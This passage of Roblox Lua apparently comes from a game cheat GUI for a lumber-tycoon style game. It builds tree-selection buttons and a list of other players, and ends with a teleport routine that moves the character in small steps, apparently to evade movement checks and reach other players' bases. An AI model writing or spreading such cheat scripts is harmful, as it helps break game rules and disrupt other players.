InfoText25.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
InfoText25.BorderColor3 = Color3.new(0, 0, 0)
InfoText25.BackgroundTransparency = 0
InfoText25.Position = UDim2.new(0, 28, 0, 330)
InfoText25.Size = UDim2.new(0, 150, 0, 150)
InfoText25.TextColor3 = Color3.fromRGB(245, 205, 48)
InfoText25.Font = Enum.Font.Fantasy
InfoText25.Text =  "Bring Trees\n\n1.Type In QTY how many trees you want.\n2.Make sure your holding a good AXE.\n CLICK on a tree"
InfoText25.TextSize = 14
InfoText25.TextWrapped = true
InfoText25.Visible = false

TreeHeader.MouseEnter:connect(function()
InfoText25.Visible = true
end)

TreeHeader.MouseLeave:connect(function()
InfoText25.Visible = false
end)

QuantityTree = Instance.new("TextBox")
QuantityTree.Name = "QuantityTree"
QuantityTree.Parent = WoodFrame
QuantityTree.BackgroundColor3 = Color3.new(0, 0, 0)
QuantityTree.BackgroundTransparency = 0.4
QuantityTree.BorderSizePixel = 1
QuantityTree.BorderColor3 = Color3.fromRGB(196, 40, 28)
QuantityTree.Position = UDim2.new(0, 320, 0, 5)
QuantityTree.Size = UDim2.new(0, 25, 0, 20)
QuantityTree.Font = Enum.Font.Fantasy
QuantityTree.Text = "2"
QuantityTree.TextColor3 = Color3.new(1, 1, 1)
QuantityTree.TextSize = 14

BirchTree = Instance.new("ImageButton")
BirchTree.Name = "BirchTree"
BirchTree.Parent = WoodFrame
BirchTree.BackgroundColor3 = Color3.new(1, 1, 1)
BirchTree.BackgroundTransparency = 0.6
BirchTree.BorderColor3 = Color3.new(0.6, 0, 0)
BirchTree.Position = UDim2.new(0, 173, 0, 33)
BirchTree.Size = UDim2.new(0, 50, 0, 50)
BirchTree.Image = "rbxassetid://4053569393"

BirchHeader = Instance.new("TextLabel")
BirchHeader.Name = "BirchHeader"
BirchHeader.Parent = WoodFrame
BirchHeader.BackgroundColor3 = Color3.new(0, 0, 0)
BirchHeader.BackgroundTransparency = 1
BirchHeader.BorderSizePixel = 1
BirchHeader.BorderColor3 = Color3.fromRGB(196, 40, 28)
BirchHeader.Position = UDim2.new(0, 173, 0, 50)
BirchHeader.Size = UDim2.new(0, 50, 0, 50)
BirchHeader.Font = Enum.Font.Fantasy
BirchHeader.Text = "Birch"
BirchHeader.TextColor3 = Color3.fromRGB(17, 17, 17)
BirchHeader.TextSize = 14

CavecrawlerTree = Instance.new("ImageButton")
CavecrawlerTree.Name = "CavecrawlerTree"
CavecrawlerTree.Parent = WoodFrame
CavecrawlerTree.BackgroundColor3 = Color3.new(1, 1, 1)
CavecrawlerTree.BackgroundTransparency = 0
CavecrawlerTree.BorderColor3 = Color3.new(0.6, 0, 0)
CavecrawlerTree.Position = UDim2.new(0, 223, 0, 33)
CavecrawlerTree.Size = UDim2.new(0, 50, 0, 50)
CavecrawlerTree.Image = "rbxassetid://4053567003"

CavecrawlerHeader = Instance.new("TextLabel")
CavecrawlerHeader.Name = "CavecrawlerHeader"
CavecrawlerHeader.Parent = WoodFrame
CavecrawlerHeader.BackgroundColor3 = Color3.new(0, 0, 0)
CavecrawlerHeader.BackgroundTransparency = 1
CavecrawlerHeader.BorderSizePixel = 1
CavecrawlerHeader.BorderColor3 = Color3.fromRGB(196, 40, 53)
CavecrawlerHeader.Position = UDim2.new(0, 223, 0, 45)
CavecrawlerHeader.Size = UDim2.new(0, 50, 0, 50)
CavecrawlerHeader.Font = Enum.Font.Fantasy
CavecrawlerHeader.Text = "Cave\nCrawler"
CavecrawlerHeader.TextColor3 = Color3.fromRGB(17, 17, 17)
CavecrawlerHeader.TextSize = 14

CherryTree = Instance.new("ImageButton")
CherryTree.Name = "CherryTree"
CherryTree.Parent = WoodFrame
CherryTree.BackgroundColor3 = Color3.new(1, 1, 1)
CherryTree.BackgroundTransparency = 0
CherryTree.BorderColor3 = Color3.new(0.6, 0, 0)
CherryTree.Position = UDim2.new(0, 173, 0, 84)
CherryTree.Size = UDim2.new(0, 50, 0, 50)
CherryTree.Image = "rbxassetid://4053570076"

CherryHeader = Instance.new("TextLabel")
CherryHeader.Name = "CherryHeader"
CherryHeader.Parent = WoodFrame
CherryHeader.BackgroundColor3 = Color3.new(0, 0, 0)
CherryHeader.BackgroundTransparency = 1
CherryHeader.BorderSizePixel = 1
CherryHeader.BorderColor3 = Color3.fromRGB(196, 40, 28)
CherryHeader.Position = UDim2.new(0, 173, 0, 100)
CherryHeader.Size = UDim2.new(0, 50, 0, 50)
CherryHeader.Font = Enum.Font.Fantasy
CherryHeader.Text = "Cherry"
CherryHeader.TextColor3 = Color3.fromRGB(17, 17, 17)
CherryHeader.TextSize = 14

ElmTree = Instance.new("ImageButton")
ElmTree.Name = "ElmTree"
ElmTree.Parent = WoodFrame
ElmTree.BackgroundColor3 = Color3.new(1, 1, 1)
ElmTree.BackgroundTransparency = 0
ElmTree.BorderColor3 = Color3.new(0.6, 0, 0)
ElmTree.Position = UDim2.new(0, 223, 0, 84)
ElmTree.Size = UDim2.new(0, 50, 0, 50)
ElmTree.Image = "rbxassetid://4053570665"

ElmHeader = Instance.new("TextLabel")
ElmHeader.Name = "ElmHeader"
ElmHeader.Parent = WoodFrame
ElmHeader.BackgroundColor3 = Color3.new(0, 0, 0)
ElmHeader.BackgroundTransparency = 1
ElmHeader.BorderSizePixel = 1
ElmHeader.BorderColor3 = Color3.fromRGB(196, 40, 28)
ElmHeader.Position = UDim2.new(0, 223, 0, 100)
ElmHeader.Size = UDim2.new(0, 50, 0, 50)
ElmHeader.Font = Enum.Font.Fantasy
ElmHeader.Text = "Elm"
ElmHeader.TextColor3 = Color3.fromRGB(17, 17, 17)
ElmHeader.TextSize = 14

Frosttree = Instance.new("ImageButton")
Frosttree.Name = "Frosttree"
Frosttree.Parent = WoodFrame
Frosttree.BackgroundColor3 = Color3.new(1, 1, 1)
Frosttree.BackgroundTransparency = 0
Frosttree.BorderColor3 = Color3.new(0.6, 0, 0)
Frosttree.Position = UDim2.new(0, 273, 0, 84)
Frosttree.Size = UDim2.new(0, 50, 0, 50)
Frosttree.Image = "rbxassetid://4053571917"

FrostHeader = Instance.new("TextLabel")
FrostHeader.Name = "FrostHeader"
FrostHeader.Parent = WoodFrame
FrostHeader.BackgroundColor3 = Color3.new(0, 0, 0)
FrostHeader.BackgroundTransparency = 1
FrostHeader.BorderSizePixel = 1
FrostHeader.BorderColor3 = Color3.fromRGB(196, 40, 28)
FrostHeader.Position = UDim2.new(0, 273, 0, 100)
FrostHeader.Size = UDim2.new(0, 50, 0, 50)
FrostHeader.Font = Enum.Font.Fantasy
FrostHeader.Text = "Frost"
FrostHeader.TextColor3 = Color3.fromRGB(17, 17, 17)
FrostHeader.TextSize = 14

GenericTree = Instance.new("ImageButton")
GenericTree.Name = "GenericTree"
GenericTree.Parent = WoodFrame
GenericTree.BackgroundColor3 = Color3.new(1, 1, 1)
GenericTree.BackgroundTransparency = 0
GenericTree.BorderColor3 = Color3.new(0.6, 0, 0)
GenericTree.Position = UDim2.new(0, 323, 0, 84)
GenericTree.Size = UDim2.new(0, 50, 0, 50)
GenericTree.Image = "rbxassetid://4053574105"

GenericHeader = Instance.new("TextLabel")
GenericHeader.Name = "GenericHeader"
GenericHeader.Parent = WoodFrame
GenericHeader.BackgroundColor3 = Color3.new(0, 0, 0)
GenericHeader.BackgroundTransparency = 1
GenericHeader.BorderSizePixel = 1
GenericHeader.BorderColor3 = Color3.fromRGB(196, 40, 28)
GenericHeader.Position = UDim2.new(0, 323, 0, 100)
GenericHeader.Size = UDim2.new(0, 50, 0, 50)
GenericHeader.Font = Enum.Font.Fantasy
GenericHeader.Text = "Generic"
GenericHeader.TextColor3 = Color3.fromRGB(17, 17, 17)
GenericHeader.TextSize = 14

ZombieHeader = Instance.new("TextLabel")
ZombieTree = Instance.new("ImageButton")
ZombieTree.Name = "ZombieTree"
ZombieTree.Parent = WoodFrame
ZombieTree.BackgroundColor3 = Color3.new(1, 1, 1)
ZombieTree.BackgroundTransparency = 0
ZombieTree.BorderColor3 = Color3.new(0.6, 0, 0)
ZombieTree.Position = UDim2.new(0, 173, 0, 134)
ZombieTree.Size = UDim2.new(0, 50, 0, 50)
ZombieTree.Image = "rbxassetid://4053578037"

ZombieHeader = Instance.new("TextLabel")
ZombieHeader.Name = "ZombieHeader"
ZombieHeader.Parent = WoodFrame
ZombieHeader.BackgroundColor3 = Color3.new(0, 0, 0)
ZombieHeader.BackgroundTransparency = 1
ZombieHeader.BorderSizePixel = 1
ZombieHeader.BorderColor3 = Color3.fromRGB(196, 40, 28)
ZombieHeader.Position = UDim2.new(0, 173, 0, 150)
ZombieHeader.Size = UDim2.new(0, 50, 0, 50)
ZombieHeader.Font = Enum.Font.Fantasy
ZombieHeader.Text = "Zombie"
ZombieHeader.TextColor3 = Color3.fromRGB(17, 17, 17)
ZombieHeader.TextSize = 14

GoldTree = Instance.new("ImageButton")
GoldTree.Name = "GoldTree"
GoldTree.Parent = WoodFrame
GoldTree.BackgroundColor3 = Color3.new(1, 1, 1)
GoldTree.BackgroundTransparency = 0
GoldTree.BorderColor3 = Color3.new(0.6, 0, 0)
GoldTree.Position = UDim2.new(0, 223, 0, 134)
GoldTree.Size = UDim2.new(0, 50, 0, 50)
GoldTree.Image = "rbxassetid://4053572372"

GoldHeader = Instance.new("TextLabel")
GoldHeader.Name = "GoldHeader"
GoldHeader.Parent = WoodFrame
GoldHeader.BackgroundColor3 = Color3.new(0, 0, 0)
GoldHeader.BackgroundTransparency = 1
GoldHeader.BorderSizePixel = 1
GoldHeader.BorderColor3 = Color3.fromRGB(196, 40, 28)
GoldHeader.Position = UDim2.new(0, 223, 0, 150)
GoldHeader.Size = UDim2.new(0, 50, 0, 50)
GoldHeader.Font = Enum.Font.Fantasy
GoldHeader.Text = "Gold"
GoldHeader.TextColor3 = Color3.fromRGB(17, 17, 17)
GoldHeader.TextSize = 14

LavaTree = Instance.new("ImageButton")
LavaTree.Name = "LavaTree"
LavaTree.Parent = WoodFrame
LavaTree.BackgroundColor3 = Color3.new(1, 1, 1)
LavaTree.BackgroundTransparency = 0
LavaTree.BorderColor3 = Color3.new(0.6, 0, 0)
LavaTree.Position = UDim2.new(0, 274, 0, 33)
LavaTree.Size = UDim2.new(0, 50, 0, 50)
LavaTree.Image = "rbxassetid://4053573529"

LavaHeader = Instance.new("TextLabel")
LavaHeader.Name = "LavaHeader"
LavaHeader.Parent = WoodFrame
LavaHeader.BackgroundColor3 = Color3.new(0, 0, 0)
LavaHeader.BackgroundTransparency = 1
LavaHeader.BorderSizePixel = 1
LavaHeader.BorderColor3 = Color3.fromRGB(196, 40, 28)
LavaHeader.Position = UDim2.new(0, 274, 0, 50)
LavaHeader.Size = UDim2.new(0, 50, 0, 50)
LavaHeader.Font = Enum.Font.Fantasy
LavaHeader.Text = "Lava"
LavaHeader.TextColor3 = Color3.fromRGB(17, 17, 17)
LavaHeader.TextSize = 14

PalmTree = Instance.new("ImageButton")
PalmTree.Name = "PalmTree"
PalmTree.Parent = WoodFrame
PalmTree.BackgroundColor3 = Color3.new(1, 1, 1)
PalmTree.BackgroundTransparency = 0
PalmTree.BorderColor3 = Color3.new(0.6, 0, 0)
PalmTree.Position = UDim2.new(0, 324, 0, 33)
PalmTree.Size = UDim2.new(0, 50, 0, 50)
PalmTree.Image = "rbxassetid://4053574535"

PalmHeader = Instance.new("TextLabel")
PalmHeader.Name = "PalmHeader"
PalmHeader.Parent = WoodFrame
PalmHeader.BackgroundColor3 = Color3.new(0, 0, 0)
PalmHeader.BackgroundTransparency = 1
PalmHeader.BorderSizePixel = 1
PalmHeader.BorderColor3 = Color3.fromRGB(196, 40, 28)
PalmHeader.Position = UDim2.new(0, 324, 0, 55)
PalmHeader.Size = UDim2.new(0, 40, 0, 40)
PalmHeader.Font = Enum.Font.Fantasy
PalmHeader.Text = "Palm"
PalmHeader.TextColor3 = Color3.fromRGB(17, 17, 17)
PalmHeader.TextSize = 14

PhantomTree = Instance.new("ImageButton")
PhantomTree.Name = "PhantomTree"
PhantomTree.Parent = WoodFrame
PhantomTree.BackgroundColor3 = Color3.new(1, 1, 1)
PhantomTree.BackgroundTransparency = 0
PhantomTree.BorderColor3 = Color3.new(0.6, 0, 0)
PhantomTree.Position = UDim2.new(0, 273, 0, 134)
PhantomTree.Size = UDim2.new(0, 50, 0, 50)
PhantomTree.Image = "rbxassetid://4053575065"

PhantomHeader = Instance.new("TextLabel")
PhantomHeader.Name = "PhantomHeader"
PhantomHeader.Parent = WoodFrame
PhantomHeader.BackgroundColor3 = Color3.new(0, 0, 0)
PhantomHeader.BackgroundTransparency = 1
PhantomHeader.BorderSizePixel = 1
PhantomHeader.BorderColor3 = Color3.fromRGB(196, 40, 28)
PhantomHeader.Position = UDim2.new(0, 273, 0, 150)
PhantomHeader.Size = UDim2.new(0, 50, 0, 50)
PhantomHeader.Font = Enum.Font.Fantasy
PhantomHeader.Text = "Phantom"
PhantomHeader.TextColor3 = Color3.fromRGB(17, 17, 17)
PhantomHeader.TextSize = 12

PineTree = Instance.new("ImageButton")
PineTree.Name = "PineTree"
PineTree.Parent = WoodFrame
PineTree.BackgroundColor3 = Color3.new(1, 1, 1)
PineTree.BackgroundTransparency = 0
PineTree.BorderColor3 = Color3.new(0.6, 0, 0)
PineTree.Position = UDim2.new(0, 323, 0, 134)
PineTree.Size = UDim2.new(0, 50, 0, 50)
PineTree.Image = "rbxassetid://4053575551"

PineHeader = Instance.new("TextLabel")
PineHeader.Name = "PineHeader"
PineHeader.Parent = WoodFrame
PineHeader.BackgroundColor3 = Color3.new(0, 0, 0)
PineHeader.BackgroundTransparency = 1
PineHeader.BorderSizePixel = 1
PineHeader.BorderColor3 = Color3.fromRGB(196, 40, 28)
PineHeader.Position = UDim2.new(0, 323, 0, 150)
PineHeader.Size = UDim2.new(0, 50, 0, 50)
PineHeader.Font = Enum.Font.Fantasy
PineHeader.Text = "Pine"
PineHeader.TextColor3 = Color3.fromRGB(17, 17, 17)
PineHeader.TextSize = 14

FirTree = Instance.new("ImageButton")
FirTree.Name = "FirTree"
FirTree.Parent = WoodFrame
FirTree.BackgroundColor3 = Color3.new(1, 1, 1)
FirTree.BackgroundTransparency = 0
FirTree.BorderColor3 = Color3.new(0.6, 0, 0)
FirTree.Position = UDim2.new(0, 173, 0, 184)
FirTree.Size = UDim2.new(0, 50, 0, 50)
FirTree.Image = "rbxassetid://4053571273"

FirHeader = Instance.new("TextLabel")
FirHeader.Name = "FirHeader"
FirHeader.Parent = WoodFrame
FirHeader.BackgroundColor3 = Color3.new(0, 0, 0)
FirHeader.BackgroundTransparency = 1
FirHeader.BorderSizePixel = 1
FirHeader.BorderColor3 = Color3.fromRGB(196, 40, 28)
FirHeader.Position = UDim2.new(0, 173, 0, 200)
FirHeader.Size = UDim2.new(0, 50, 0, 50)
FirHeader.Font = Enum.Font.Fantasy
FirHeader.Text = "Fir"
FirHeader.TextColor3 = Color3.fromRGB(17, 17, 17)
FirHeader.TextSize = 14

Snowglowtree = Instance.new("ImageButton")
Snowglowtree.Name = "Snowglowtree"
Snowglowtree.Parent = WoodFrame
Snowglowtree.BackgroundColor3 = Color3.new(1, 1, 1)
Snowglowtree.BackgroundTransparency = 0
Snowglowtree.BorderColor3 = Color3.new(0.6, 0, 0)
Snowglowtree.Position = UDim2.new(0, 273, 0, 184)
Snowglowtree.Size = UDim2.new(0, 50, 0, 50)
Snowglowtree.Image = "rbxassetid://4053576507"

SnowglowHeader = Instance.new("TextLabel")
SnowglowHeader.Name = "SnowglowHeader"
SnowglowHeader.Parent = WoodFrame
SnowglowHeader.BackgroundColor3 = Color3.new(0, 0, 0)
SnowglowHeader.BackgroundTransparency = 1
SnowglowHeader.BorderSizePixel = 1
SnowglowHeader.BorderColor3 = Color3.fromRGB(196, 40, 28)
SnowglowHeader.Position = UDim2.new(0, 273, 0, 200)
SnowglowHeader.Size = UDim2.new(0, 50, 0, 50)
SnowglowHeader.Font = Enum.Font.Fantasy
SnowglowHeader.Text = "SnowGlow"
SnowglowHeader.TextColor3 = Color3.fromRGB(17, 17, 17)
SnowglowHeader.TextSize = 11

WalnutTree = Instance.new("ImageButton")
WalnutTree.Name = "WalnutTree"
WalnutTree.Parent = WoodFrame
WalnutTree.BackgroundColor3 = Color3.new(1, 1, 1)
WalnutTree.BackgroundTransparency = 0
WalnutTree.BorderColor3 = Color3.new(0.6, 0, 0)
WalnutTree.Position = UDim2.new(0, 223, 0, 184)
WalnutTree.Size = UDim2.new(0, 50, 0, 50)
WalnutTree.Image = "rbxassetid://4053577500"

WalnutHeader = Instance.new("TextLabel")
WalnutHeader.Name = "WalnutHeader"
WalnutHeader.Parent = WoodFrame
WalnutHeader.BackgroundColor3 = Color3.new(0, 0, 0)
WalnutHeader.BackgroundTransparency = 1
WalnutHeader.BorderSizePixel = 1
WalnutHeader.BorderColor3 = Color3.fromRGB(196, 40, 28)
WalnutHeader.Position = UDim2.new(0, 223, 0, 200)
WalnutHeader.Size = UDim2.new(0, 50, 0, 50)
WalnutHeader.Font = Enum.Font.Fantasy
WalnutHeader.Text = "Walnut"
WalnutHeader.TextColor3 = Color3.fromRGB(17, 17, 17)
WalnutHeader.TextSize = 14

KoaTree = Instance.new("ImageButton")
KoaTree.Name = "KoaTree"
KoaTree.Parent = WoodFrame
KoaTree.BackgroundColor3 = Color3.new(1, 1, 1)
KoaTree.BackgroundTransparency = 0
KoaTree.BorderColor3 = Color3.new(0.6, 0, 0)
KoaTree.Position = UDim2.new(0, 323, 0, 184)
KoaTree.Size = UDim2.new(0, 50, 0, 50)
KoaTree.Image = "rbxassetid://4053573002"

KoaHeader = Instance.new("TextLabel")
KoaHeader.Name = "KoaHeader"
KoaHeader.Parent = WoodFrame
KoaHeader.BackgroundColor3 = Color3.new(0, 0, 0)
KoaHeader.BackgroundTransparency = 1
KoaHeader.BorderSizePixel = 1
KoaHeader.BorderColor3 = Color3.fromRGB(196, 40, 28)
KoaHeader.Position = UDim2.new(0, 323, 0, 200)
KoaHeader.Size = UDim2.new(0, 50, 0, 50)
KoaHeader.Font = Enum.Font.Fantasy
KoaHeader.Text = "Koa"
KoaHeader.TextColor3 = Color3.fromRGB(17, 17, 17)
KoaHeader.TextSize = 14

SinisterTree = Instance.new("ImageButton")
SinisterTree.Name = "SinisterGlowTree"
SinisterTree.Parent = WoodFrame
SinisterTree.BackgroundColor3 = Color3.new(1, 1, 1)
SinisterTree.BackgroundTransparency = 0
SinisterTree.BorderColor3 = Color3.new(0.6, 0, 0)
SinisterTree.Position = UDim2.new(0, 40, 0, 351)
SinisterTree.Size = UDim2.new(0, 50, 0, 50)
SinisterTree.Image = "rbxassetid://4053576051"

SinisterGlowHeader = Instance.new("TextLabel")
SinisterGlowHeader.Name = "SinisterGlowHeader"
SinisterGlowHeader.Parent = WoodFrame
SinisterGlowHeader.BackgroundColor3 = Color3.new(0, 0, 0)
SinisterGlowHeader.BackgroundTransparency = 1
SinisterGlowHeader.BorderSizePixel = 1
SinisterGlowHeader.BorderColor3 = Color3.fromRGB(196, 40, 28)
SinisterGlowHeader.Position = UDim2.new(0, 40, 0, 366)
SinisterGlowHeader.Size = UDim2.new(0, 50, 0, 50)
SinisterGlowHeader.Font = Enum.Font.Fantasy
SinisterGlowHeader.Text = "Sinister"
SinisterGlowHeader.TextColor3 = Color3.fromRGB(17, 17, 17)
SinisterGlowHeader.TextSize = 14

SpookTree = Instance.new("ImageButton")
SpookTree.Name = "SpookTree"
SpookTree.Parent = WoodFrame
SpookTree.BackgroundColor3 = Color3.new(1, 1, 1)
SpookTree.BackgroundTransparency = 0
SpookTree.BorderColor3 = Color3.new(0.6, 0, 0)
SpookTree.Position = UDim2.new(0, 95, 0, 351)
SpookTree.Size = UDim2.new(0, 50, 0, 50)
SpookTree.Image = "rbxassetid://4053576987"

SpookHeader = Instance.new("TextLabel")
SpookHeader.Name = "SpookHeader"
SpookHeader.Parent = WoodFrame
SpookHeader.BackgroundColor3 = Color3.new(0, 0, 0)
SpookHeader.BackgroundTransparency = 1
SpookHeader.BorderSizePixel = 1
SpookHeader.BorderColor3 = Color3.fromRGB(196, 40, 28)
SpookHeader.Position = UDim2.new(0, 95, 0, 366)
SpookHeader.Size = UDim2.new(0, 50, 0, 50)
SpookHeader.Font = Enum.Font.Fantasy
SpookHeader.Text = "Spook"
SpookHeader.TextColor3 = Color3.fromRGB(17, 17, 17)
SpookHeader.TextSize = 14

INFOHeader = Instance.new("TextLabel")
INFOHeader.Name = "INFOHeader"
INFOHeader.Parent = WoodFrame
INFOHeader.BackgroundColor3 = Color3.new(0, 0, 0)
INFOHeader.BackgroundTransparency = 1
INFOHeader.BorderSizePixel = 1
INFOHeader.BorderColor3 = Color3.fromRGB(196, 40, 28)
INFOHeader.Position = UDim2.new(0, 65, 0, 310)
INFOHeader.Size = UDim2.new(0, 50, 0, 50)
INFOHeader.Font = Enum.Font.Fantasy
INFOHeader.Text = "Halloween Event"
INFOHeader.TextColor3 = Color3.fromRGB(245, 205, 48)
INFOHeader.TextSize = 14

PlayerNameb = Instance.new("TextBox")
PlayerNameb.Name = "PlayerNameb"
PlayerNameb.Parent = WoodFrame
PlayerNameb.BackgroundColor3 = Color3.new(0, 0, 0)
PlayerNameb.BorderColor3 = Color3.new(1, 0, 0)
PlayerNameb.BackgroundTransparency = 0.6
PlayerNameb.Position = UDim2.new(0, 198, 0, 238)
PlayerNameb.Size = UDim2.new(0, 160, 0, 20)
PlayerNameb.Font = Enum.Font.Fantasy
PlayerNameb.Text = "Need Name"
PlayerNameb.TextColor3 = Color3.new(0, 1, 0)
PlayerNameb.TextSize = 14

Player1b = Instance.new("TextButton")
Player1b.Name = "Player1"
Player1b.Parent = WoodFrame
Player1b.BackgroundColor3 = Color3.new(0, 0, 0)
Player1b.BackgroundTransparency = 0.6
Player1b.BorderColor3 = Color3.new(1, 0, 0)
Player1b.Position = UDim2.new(0, 198, 0, 261)
Player1b.Size = UDim2.new(0, 160, 0, 20)
Player1b.Font = Enum.Font.Fantasy
Player1b.Text = ""
Player1b.TextColor3 = Color3.fromRGB(245, 205, 48)
Player1b.TextSize = 14

Player2b = Instance.new("TextButton")
Player2b.Name = "Player2"
Player2b.Parent = WoodFrame
Player2b.BackgroundColor3 = Color3.new(0, 0, 0)
Player2b.BackgroundTransparency = 0.6
Player2b.BorderColor3 = Color3.new(1, 0, 0)
Player2b.Position = UDim2.new(0, 198, 0, 284)
Player2b.Size = UDim2.new(0, 160, 0, 20)
Player2b.Font = Enum.Font.Fantasy
Player2b.Text = ""
Player2b.TextColor3 = Color3.fromRGB(245, 205, 48)
Player2b.TextSize = 14

Player3b = Instance.new("TextButton")
Player3b.Name = "Player3"
Player3b.Parent = WoodFrame
Player3b.BackgroundColor3 = Color3.new(0, 0, 0)
Player3b.BackgroundTransparency = 0.6
Player3b.BorderColor3 = Color3.new(1, 0, 0)
Player3b.Position = UDim2.new(0, 198, 0, 307)
Player3b.Size = UDim2.new(0, 160, 0, 20)
Player3b.Font = Enum.Font.Fantasy
Player3b.Text = ""
Player3b.TextColor3 = Color3.fromRGB(245, 205, 48)
Player3b.TextSize = 14


Player4b = Instance.new("TextButton")
Player4b.Name = "Player4"
Player4b.Parent = WoodFrame
Player4b.BackgroundColor3 = Color3.new(0, 0, 0)
Player4b.BackgroundTransparency = 0.6
Player4b.BorderColor3 = Color3.new(1, 0, 0)
Player4b.Position = UDim2.new(0, 198, 0, 330)
Player4b.Size = UDim2.new(0, 160, 0, 20)
Player4b.Font = Enum.Font.Fantasy
Player4b.Text = ""
Player4b.TextColor3 = Color3.fromRGB(245, 205, 48)
Player4b.TextSize = 14

Player5b = Instance.new("TextButton")
Player5b.Name = "Player5"
Player5b.Parent = WoodFrame
Player5b.BackgroundColor3 = Color3.new(0, 0, 0)
Player5b.BackgroundTransparency = 0.6
Player5b.BorderColor3 = Color3.new(1, 0, 0)
Player5b.Position = UDim2.new(0, 198, 0, 353)
Player5b.Size = UDim2.new(0, 160, 0, 20)
Player5b.Font = Enum.Font.Fantasy
Player5b.Text = ""
Player5b.TextColor3 = Color3.fromRGB(245, 205, 48)
Player5b.TextSize = 14

Player6b = Instance.new("TextButton")
Player6b.Name = "Player6"
Player6b.Parent = WoodFrame
Player6b.BackgroundColor3 = Color3.new(0, 0, 0)
Player6b.BackgroundTransparency = 0.6
Player6b.BorderColor3 = Color3.new(1, 0, 0)
Player6b.Position = UDim2.new(0, 198, 0, 376)
Player6b.Size = UDim2.new(0, 160, 0, 20)
Player6b.Font = Enum.Font.Fantasy
Player6b.FontSize = Enum.FontSize.Size18
Player6b.Text = ""
Player6b.TextColor3 = Color3.fromRGB(245, 205, 48)
Player6b.TextSize = 14

INFOHeader2 = Instance.new("TextLabel")
INFOHeader2.Name = "INFOHeader"
INFOHeader2.Parent = WoodFrame
INFOHeader2.BackgroundColor3 = Color3.new(0, 0, 0)
INFOHeader2.BackgroundTransparency = 1
INFOHeader2.BorderSizePixel = 1
INFOHeader2.BorderColor3 = Color3.fromRGB(196, 40, 28)
INFOHeader2.Position = UDim2.new(0, 180, 0, 400)
INFOHeader2.Size = UDim2.new(0, 50, 0, 50)
INFOHeader2.Font = Enum.Font.Fantasy
INFOHeader2.Text = "Click Your Name for wood to go to your base.\nClick other Players names to go to theres."
INFOHeader2.TextColor3 = Color3.fromRGB(245, 205, 48)
INFOHeader2.TextSize = 14
Player6.TextWrapped = true

  --- Player Tp ---

	local buttons = {
		Player1b,
		Player2b,
		Player3b,
		Player4b,
		Player5b,
		Player6b
	}
	spawn(function()
		while true do
			Player1b.Text = ""
			Player2b.Text = ""
			Player3b.Text = ""
			Player4b.Text = ""
			Player5b.Text = ""
			Player6b.Text = ""
			for i, v in pairs(game.Players:GetChildren()) do
				buttons[i].Text = v.Name
				buttons[i].Visible = true
			end
			wait(0.5)
		end
	end)

    Player1b.MouseButton1Down:connect(function()
       PlayerNameb.Text = Player1b.Text
    end)
    Player2b.MouseButton1Down:connect(function()
       PlayerNameb.Text = Player2b.Text
    end)
    Player3b.MouseButton1Down:connect(function()
      PlayerNameb.Text = Player3b.Text
    end)
    Player4b.MouseButton1Down:connect(function()
       PlayerNameb.Text = Player4b.Text
    end)
    Player5b.MouseButton1Down:connect(function()
      PlayerNameb.Text = Player5b.Text
    end)
    Player6b.MouseButton1Down:connect(function()
      PlayerNameb.Text = Player6b.Text
    end)

function Teleport(XP,YP,ZP)
-- Config How Many Blocks It Will Tp You Untill The Final Destination:
local XTpEvery = 15
local YTpEvery = 15
local ZTpEvery = 15
--Time to Tp Every:
local Timer = 0.001
local pos = game:GetService('Players').LocalPlayer.Character.HumanoidRootPart
if pos.Position.X < XP then
for x = pos.Position.X,XP,XTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(x,pos.Position.Y,pos.Position.Z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
else
for x = pos.Position.X,XP,-XTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(x,pos.Position.Y,pos.Position.Z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
end
if pos.Position.Z < ZP then
for z = pos.Position.Z,ZP,ZTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(pos.Position.X,pos.Position.Y,z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
else
for z = pos.Position.Z,ZP,-ZTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(pos.Position.X,pos.Position.Y,z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
end
if pos.Position.Y < YP then
for High = pos.Position.Y,YP,YTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(pos.Position.X ,High ,pos.Position.Z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
else
for High = pos.Position.Y,YP,-YTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(pos.Position.X ,High ,pos.Position.Z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
end
game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(XP + 5,YP,ZP + 5)
end

